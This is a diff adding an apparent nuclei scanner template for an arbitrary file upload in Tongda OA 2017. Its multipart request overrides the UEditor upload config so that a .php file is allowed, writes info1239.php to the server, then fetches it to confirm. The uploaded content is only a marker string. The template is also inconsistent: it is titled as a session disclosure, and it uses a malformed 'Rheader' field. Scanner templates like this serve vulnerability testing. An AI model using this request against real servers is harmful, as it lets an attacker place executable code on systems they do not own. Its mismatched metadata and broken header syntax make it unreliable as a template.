@@ -1,0 +1,59 @@
+id: 通达OA 2017 任意文件上传
+
+info:
+  name: Tongda User Session Disclosure
+  author: ritikchaddha
+  severity: medium
+  description: 无说明
+  tags: tongda,disclosure
+  metadata:
+    max-request: 1
+
+http:
+  - method: 
+      - POST
+      - GET
+    path:
+      - "{{BaseURL}}/module/ueditor/php/action_upload.php?action=uploadfile"
+      - "{{BaseURL}}/info1239.php"
+    Rheader:
+      - Content-Type:multipart/form-data;boundary=---------------------------55719851240137822763221368724, & X_requested_with:XMLHttpRequest, & Accept-Encoding:gzip,
+    body: 
+      - |
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="CONFIG[fileFieldName]"
+
+        ffff
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="CONFIG[fileMaxSize]"
+
+        1000000000
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="CONFIG[filePathFormat]"
+
+        info1239
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="CONFIG[fileAllowFiles][]"
+
+        .php
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="ffff"; filename="info1239.php"
+        Content-Type: application/octet-stream
+
+        hiword!!!
+        -----------------------------55719851240137822763221368724
+        Content-Disposition: form-data; name="mufile"
+
+        submit
+        -----------------------------55719851240137822763221368724--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "hiword!!!"
+
+      - type: status
+        status:
+          - 200
